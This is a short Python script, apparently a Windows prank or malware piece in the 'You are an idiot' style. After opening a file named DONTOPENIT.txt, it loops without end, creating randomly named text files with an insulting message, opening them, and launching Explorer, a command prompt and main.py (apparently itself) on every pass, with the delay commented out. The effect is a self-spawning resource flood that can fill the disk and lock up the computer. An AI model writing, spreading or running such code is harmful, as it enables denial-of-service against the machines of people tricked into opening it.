from os import system
from time import sleep
from random import uniform

system('start DONTOPENIT.txt')

sleep(5)

while True:
	name = int(uniform(0, 9999999))

	file = open(f'{name}.txt', 'a')
	file.write('You are an idiot! :)')
	file.close()
	system(f'start {name}.txt')
	system('start explorer')
	system('start cmd')
	system('start main.py')
	print('You are an idiot!')

	# sleep(1)